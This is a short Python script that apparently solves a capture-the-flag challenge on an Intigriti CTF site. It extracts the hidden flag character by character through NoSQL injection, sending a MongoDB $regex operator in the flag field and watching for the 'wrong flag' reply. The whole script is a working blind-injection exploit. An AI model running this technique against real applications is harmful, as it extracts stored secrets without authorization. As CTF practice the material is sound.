import requests

url = "https://ctfc.ctf.intigriti.io/submit_flag"
session_cookie = "session=[ACTUAL_COOKIE]"

alr_flag = ""

def send_flag_request(flag, char):
    global alr_flag
    
    headers = {
        "Content-Type": "application/json",
        "Cookie": session_cookie
    }

    data = {
        "_id": "3",
        "challenge_flag": {
            "$regex": flag
        }
    }

    response = requests.post(url, headers=headers, json=data)

    if "wrong flag!" in response.text.lower():
        return

    else:
        print("Flag-Part Found: INTIGRITI{" + alr_flag + char + "}")
        alr_flag += char
        return True 

while True:
    restart_loop = False
    
    for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
        flag = "INTIGRITI{" + alr_flag + char + ".*?}"
        if send_flag_request(flag, char):
            restart_loop = True 
            break  
    
    if not restart_loop:
        break
